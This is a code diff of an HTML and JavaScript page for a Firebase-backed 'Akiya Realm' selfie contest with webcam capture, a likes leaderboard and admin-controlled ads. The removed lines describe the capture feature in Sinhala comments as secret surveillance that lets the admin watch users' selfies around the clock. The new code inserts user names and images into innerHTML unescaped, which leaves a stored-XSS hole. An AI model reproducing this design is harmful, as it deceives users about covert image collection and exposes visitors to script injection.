@@ -1,149 +1,270 @@
-<!-- කලින් තිබුණු Styles වලට මේ ටික ඇඩ් කරගන්න (Damage වෙන්නේ නැහැ) -->
-<style>
-    /* --- NEW UPDATES & ADS POSTER SECTION --- */
-    .master-updates {
-        width: 90%; margin: 20px auto; padding: 20px;
-        background: rgba(26, 0, 0, 0.9); border: 1px solid var(--primary);
-        box-shadow: 0 0 15px var(--primary); display: flex; align-items: center; gap: 20px;
-    }
-    .poster-img { width: 300px; height: 180px; object-fit: cover; border: 2px solid white; }
-    .update-content { flex: 1; text-align: left; }
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AKIYA REALM 2026 | THE DRAGON</title>
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #ff0000;
+            --secondary: #1a1a1a;
+            --accent: #8b0000;
+            --gold: #ffd700;
+            --text: #ffffff;
+        }
 
-    /* --- DAILY FAMOUS USER CARDS --- */
-    .famous-contest { padding: 40px; background: #0a0a0a; }
-    .winners-grid { display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; }
-    .winner-card {
-        width: 200px; border: 2px solid gold; padding: 10px; background: #111;
-        position: relative; transition: 0.4s;
-    }
-    .winner-card.place-1 { transform: scale(1.1); border-color: gold; box-shadow: 0 0 20px gold; }
-    .winner-card.place-2 { border-color: silver; }
-    .winner-card.place-3 { border-color: #cd7f32; }
-    .like-btn { 
-        background: none; border: 1px solid var(--primary); color: white; 
-        cursor: pointer; padding: 5px 10px; margin-top: 5px; 
-    }
-    .like-btn:hover { background: var(--primary); }
+        body {
+            margin: 0;
+            background: #050505;
+            color: var(--text);
+            font-family: 'Rajdhani', sans-serif;
+            overflow-x: hidden;
+        }
 
-    /* --- COMPANY ADS SECTION --- */
-    .company-ad-card {
-        background: #000; border: 1px dashed #555; padding: 15px; margin: 20px auto; width: 80%;
-    }
-    .ad-video { width: 100%; max-width: 400px; height: auto; }
-</style>
+        #web-canvas {
+            position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3;
+        }
 
-<!-- [1] MASTER UPDATES POSTER SECTION (ADMIN PANNEL එකෙන් පාලනය වේ) -->
-<section class="master-updates" id="master-poster">
-    <img src="https://via.placeholder.com/1920x1080" class="poster-img" id="admin-poster-img">
-    <div class="update-content">
-        <h2 id="update-title" style="color: var(--primary); margin: 0;">NEW SYSTEM UPDATE</h2>
-        <p id="update-text">The Realm is evolving. Watch out for new Guardian features!</p>
-        <span id="res-indicator" style="font-size: 0.7rem; color: #888;">RESOLUTION: 1920x1080</span>
-    </div>
-</section>
+        /* --- STYLISH NAVBAR --- */
+        nav {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 15px 40px; background: rgba(0, 0, 0, 0.9);
+            border-bottom: 2px solid var(--primary); position: sticky; top: 0; z-index: 100;
+            box-shadow: 0 5px 20px rgba(255, 0, 0, 0.2);
+        }
 
-<!-- [2] DAILY FAMOUS USER CONTEST (THE HOOK) -->
-<section class="famous-contest">
-    <h2 style="text-align:center; font-family: 'Orbitron';">DRAGON'S TOP 3 GUARDIANS</h2>
-    <div class="winners-grid" id="contest-winners">
-        <!-- Winners 1, 2, 3 appear here -->
-    </div>
-</section>
+        .logo {
+            font-family: 'Orbitron', sans-serif; font-size: 1.4rem;
+            color: var(--primary); text-shadow: 0 0 10px var(--primary);
+        }
 
-<!-- [3] DIRECT COMPANY ADS (COMPANY ADS SECTION) -->
-<div class="company-ad-card" id="company-ad">
-    <h4 style="margin: 0; color: #ffcc00;">SPONSORED</h4>
-    <div style="display: flex; gap: 20px; align-items: center; flex-wrap: wrap;">
-        <video class="ad-video" autoplay muted loop id="ad-video-src">
+        .live-tag {
+            background: var(--primary); padding: 4px 12px; border-radius: 20px;
+            font-family: 'Orbitron'; font-size: 0.7rem; animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink { 50% { opacity: 0.5; } }
+
+        /* --- NEW: MASTER UPDATES SECTION --- */
+        .master-updates {
+            width: 90%; max-width: 1200px; margin: 30px auto;
+            background: linear-gradient(90deg, #1a0000, #000);
+            border: 1px solid var(--primary); display: flex; align-items: center;
+            overflow: hidden; border-radius: 10px; box-shadow: 0 0 30px rgba(255,0,0,0.1);
+        }
+        .poster-container { flex: 1; min-height: 250px; position: relative; }
+        .poster-img { width: 100%; height: 100%; object-fit: cover; }
+        .update-info { flex: 1.2; padding: 30px; text-align: left; }
+
+        /* --- DRAGON RITE (CAMERA) --- */
+        .dragon-rite { padding: 60px 20px; text-align: center; }
+        #camera-feed {
+            width: 100%; max-width: 500px; border: 3px solid var(--primary);
+            border-radius: 20px; box-shadow: 0 0 40px rgba(255,0,0,0.3);
+        }
+
+        /* --- BUTTONS --- */
+        .btn-dragon {
+            background: var(--primary); color: white; padding: 12px 30px;
+            font-family: 'Orbitron', sans-serif; border: none; cursor: pointer;
+            transition: 0.4s; clip-path: polygon(10% 0, 100% 0, 90% 100%, 0 100%);
+            margin-top: 15px; font-weight: bold;
+        }
+        .btn-dragon:hover { background: white; color: black; letter-spacing: 2px; }
+
+        /* --- CONTEST & GALLERY --- */
+        .contest-section { background: #0a0a0a; padding: 50px 20px; text-align: center; }
+        .winners-grid { display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-top: 30px; }
+        .winner-card {
+            width: 220px; background: #111; border: 2px solid #333; padding: 15px;
+            border-radius: 15px; transition: 0.3s; position: relative;
+        }
+        .place-1 { border-color: var(--gold); box-shadow: 0 0 20px var(--gold); transform: scale(1.05); }
+        .like-badge {
+            background: var(--primary); padding: 5px 15px; border-radius: 10px;
+            cursor: pointer; display: inline-block; margin-top: 10px; font-size: 0.9rem;
+        }
+
+        /* --- COMPANY ADS --- */
+        .ad-banner {
+            width: 85%; margin: 40px auto; background: #000; border: 1px dashed #444;
+            display: flex; align-items: center; gap: 20px; padding: 20px; border-radius: 10px;
+        }
+        .ad-video { width: 300px; border-radius: 8px; }
+
+        footer { padding: 40px; text-align: center; border-top: 1px solid #222; font-size: 0.8rem; opacity: 0.6; }
+    </style>
+</head>
+<body>
+
+    <canvas id="web-canvas"></canvas>
+
+    <nav>
+        <div class="logo">AKIYA REALM 2026</div>
+        <div class="live-tag" id="live-visitors">LIVE: 1</div>
+        <div class="user-profile" id="user-display">
+            <button class="btn-dragon" onclick="login()" style="font-size: 0.7rem;">LOGIN</button>
+        </div>
+    </nav>
+
+    <!-- [1] ADMIN UPDATES & POSTER -->
+    <section class="master-updates">
+        <div class="poster-container">
+            <img src="https://via.placeholder.com/1920x1080/200000/ffffff?text=NEW+REALM+UPDATE" class="poster-img" id="admin-poster">
+        </div>
+        <div class="update-info">
+            <h2 id="update-title" style="font-family: 'Orbitron'; color: var(--primary); margin:0;">SYSTEM UPDATE v2.0</h2>
+            <p id="update-desc" style="color: #ccc;">The Dragon is watching. New Guardian features have been integrated into the core.</p>
+            <small id="res-tag" style="color: #666;">RESOLUTION: 1920x1080</small>
+        </div>
+    </section>
+
+    <!-- [2] DRAGON RITE (CAMERA SECTION) -->
+    <section class="dragon-rite">
+        <h2 style="font-family: 'Orbitron'; letter-spacing: 4px;">THE DRAGON RITE</h2>
+        <p style="opacity: 0.7;">Upload your aura to become a Legend in the Realm.</p>
+        <video id="camera-feed" autoplay playsinline></video>
+        <br>
+        <button class="btn-dragon" onclick="captureGuardian()">CAPTURE & ENTER CONTEST</button>
+    </section>
+
+    <!-- [3] DAILY FAMOUS CONTEST -->
+    <section class="contest-section">
+        <h2 style="font-family: 'Orbitron';">TOP 3 GUARDIANS OF THE DAY</h2>
+        <div class="winners-grid" id="contest-winners">
+            <!-- Winners will load here from Firebase -->
+        </div>
+    </section>
+
+    <!-- [4] COMPANY ADS SECTION -->
+    <div class="ad-banner" id="company-ad">
+        <video class="ad-video" autoplay muted loop id="ad-vid">
             <source src="" type="video/mp4">
         </video>
         <div>
-            <h3 id="ad-title">JOIN OUR ALLIANCE</h3>
-            <p id="ad-desc">Special offers for the Akiya Realm community.</p>
-            <a href="#" id="ad-link" class="btn-dragon" style="text-decoration: none; font-size: 0.8rem;">VISIT NOW</a>
+            <h4 style="margin:0; color: var(--gold);">SPONSORED AD</h4>
+            <h3 id="ad-title" style="margin:5px 0;">JOIN THE ELITE</h3>
+            <p id="ad-text" style="font-size: 0.9rem; opacity: 0.8;">Exclusive deals for Akiya Realm members.</p>
+            <a href="#" id="ad-link" class="btn-dragon" style="text-decoration:none; font-size:0.7rem; padding: 8px 20px;">VISIT NOW</a>
         </div>
     </div>
-</div>
 
-<script>
-    // --- LOGIN PERSISTENCE (මාසයක් සේව් වීම) ---
-    firebase.auth().setPersistence(firebase.auth.Auth.Persistence.LOCAL);
+    <footer>
+        DESIGNED BY AKIYA | THE DRAGON REALM &copy; 2026
+        ALL RIGHT RESEVED ©2026| SECURITY | FAST | STABALE &copy; BEST SOCIAL LINK SHERE PLATFORM 
+    </footer>
 
-    // --- [3 & 4] ADVANCED GUARDIAN EYE (රහසිගත නිරීක්ෂණය) ---
-    function captureGuardian() {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0);
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
 
-        // AI Face Effect එකක් වගේ පේන්න (Watermark)
-        ctx.fillStyle = "rgba(255, 0, 0, 0.5)";
-        ctx.font = "20px Orbitron";
-        ctx.fillText("🐲 DRAGON AURA ACTIVE", 10, 30);
+    <script>
+        // පින්තූරවල තිබුණු උඹේම Original Config එක
+        const firebaseConfig = {
+            apiKey: "AIzaSyDEmPDHu3jybcYu-nKl5cCHyyWNnerex-w",
+            authDomain: "akiya-communitiy-official-lk.firebaseapp.com",
+            databaseURL: "https://akiya-communitiy-official-lk-default-rtdb.firebaseio.com",
+            projectId: "akiya-communitiy-official-lk",
+            storageBucket: "akiya-communitiy-official-lk.firebasestorage.app",
+            messagingSenderId: "180586817754",
+            appId: "1:180586817754:web:c505feb010c7c67c15dde3"
+        };
 
-        const dataUrl = canvas.toDataURL('image/webp', 0.5); // Quality එක අඩු කරලා වේගවත් කළා
-        
-        const user = firebase.auth().currentUser;
-        const uid = user ? user.uid : "guest_" + Date.now();
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const auth = firebase.auth();
 
-        // සෙල්ෆි එක තරඟයට දාන අතරේම, 
-        // ඇඩ්මින්ට පැය 24ම බලන්න පුළුවන් විදිහට බැක්එන්ඩ් එකට යනවා
-        db.ref('guardians/' + uid).set({
-            name: user ? user.displayName : "Anonymous",
-            image: dataUrl,
-            lastSeen: Date.now(),
-            liveStatus: "Active"
-        });
-        
-        alert("You have joined the Daily Famous Contest!");
-    }
-
-    // --- [6] ADMIN POSTER & RESOLUTION CHECK ---
-    db.ref('admin_settings/poster').on('value', snap => {
-        const data = snap.val();
-        if(data) {
-            document.getElementById('admin-poster-img').src = data.url;
-            document.getElementById('update-title').innerText = data.title;
-            document.getElementById('update-text').innerText = data.description;
-            document.getElementById('res-indicator').innerText = `RESOLUTION: ${data.res || 'Unknown'}`;
+        // 1. Google Login
+        function login() {
+            const provider = new firebase.auth.GoogleAuthProvider();
+            auth.signInWithPopup(provider).then(result => {
+                const user = result.user;
+                document.getElementById('user-display').innerHTML = `<img src="${user.photoURL}" style="width:40px; border-radius:50%; border:2px solid red;">`;
+            });
         }
-    });
 
-    // --- [7] DIRECT COMPANY ADS LOADER ---
-    db.ref('admin_settings/company_ad').on('value', snap => {
-        const ad = snap.val();
-        if(ad) {
-            document.getElementById('ad-title').innerText = ad.title;
-            document.getElementById('ad-desc').innerText = ad.desc;
-            document.getElementById('ad-link').href = ad.link;
-            if(ad.videoUrl) {
-                const v = document.getElementById('ad-video-src');
-                v.src = ad.videoUrl; v.load();
+        // 2. Camera Logic
+        const video = document.getElementById('camera-feed');
+        if (navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => video.srcObject = stream);
+        }
+
+        // 3. Capture & Contest Entry
+        function captureGuardian() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            const dataUrl = canvas.toDataURL('image/webp', 0.6);
+            
+            const user = auth.currentUser;
+            const uid = user ? user.uid : "guest_" + Date.now();
+            
+            db.ref('guardians/' + uid).set({
+                name: user ? user.displayName : "Anonymous",
+                image: dataUrl,
+                likes: 0,
+                timestamp: Date.now()
+            });
+            alert("Entry Submitted to Contest!");
+        }
+
+        // 4. Like System
+        function likeUser(uid) {
+            db.ref('guardians/' + uid + '/likes').transaction(l => (l || 0) + 1);
+        }
+
+        // 5. Load Contest Winners (Top 3)
+        db.ref('guardians').orderByChild('likes').limitToLast(3).on('value', snap => {
+            const container = document.getElementById('contest-winners');
+            container.innerHTML = '';
+            let place = 3;
+            snap.forEach(child => {
+                const v = child.val();
+                const card = `
+                    <div class="winner-card ${place === 1 ? 'place-1' : ''}">
+                        <div style="color:var(--gold); font-weight:bold;">#${place} RANK</div>
+                        <img src="${v.image}" width="100%" style="border-radius:10px; margin:10px 0;">
+                        <div style="font-size:0.8rem;">${v.name}</div>
+                        <div class="like-badge" onclick="likeUser('${child.key}')">❤️ ${v.likes || 0}</div>
+                    </div>
+                `;
+                container.innerHTML = card + container.innerHTML;
+                place--;
+            });
+        });
+
+        // 6. Admin Data Sync
+        db.ref('admin_settings/poster').on('value', snap => {
+            const d = snap.val();
+            if(d) {
+                document.getElementById('admin-poster').src = d.url;
+                document.getElementById('update-title').innerText = d.title;
+                document.getElementById('res-tag').innerText = "RESOLUTION: " + (d.res || "1920x1080");
+            }
+        });
+
+        // 7. Live Visitors
+        db.ref('presence').on('value', snap => {
+            document.getElementById('live-visitors').innerText = `LIVE: ${snap.numChildren() || 1}`;
+        });
+
+        // --- BACKGROUND EFFECT ---
+        const webCanvas = document.getElementById('web-canvas');
+        const webCtx = webCanvas.getContext('2d');
+        webCanvas.width = window.innerWidth; webCanvas.height = window.innerHeight;
+        function drawWeb() {
+            webCtx.clearRect(0,0, webCanvas.width, webCanvas.height);
+            webCtx.strokeStyle = '#ff0000'; webCtx.lineWidth = 0.3;
+            for(let i=0; i<webCanvas.width; i+=80) {
+                webCtx.beginPath(); webCtx.moveTo(i,0); webCtx.lineTo(webCanvas.width-i, webCanvas.height); webCtx.stroke();
             }
         }
-    });
-
-    // --- [3] LIKE SYSTEM & WINNERS ---
-    function giveLike(uid) {
-        db.ref('guardians/' + uid + '/likes').transaction(current => (current || 0) + 1);
-    }
-
-    db.ref('guardians').orderByChild('likes').limitToLast(3).on('value', snap => {
-        const winnersDiv = document.getElementById('contest-winners');
-        winnersDiv.innerHTML = '';
-        let place = 3;
-        snap.forEach(child => {
-            const val = child.val();
-            winnersDiv.innerHTML = `
-                <div class="winner-card place-${place}">
-                    <span style="position:absolute; top:-10px; left:-10px; background:gold; color:black; padding:2px 10px; font-weight:bold;">#${place}</span>
-                    <img src="${val.image}" width="100%">
-                    <p style="margin:5px 0; font-size:0.8rem;">${val.name}</p>
-                    <button class="like-btn" onclick="giveLike('${child.key}')">❤️ ${val.likes || 0}</button>
-                </div>
-            ` + winnersDiv.innerHTML;
-            place--;
-        });
-    });
-</script>
+        setInterval(drawWeb, 100);
+    </script>
+</body>
+</html>
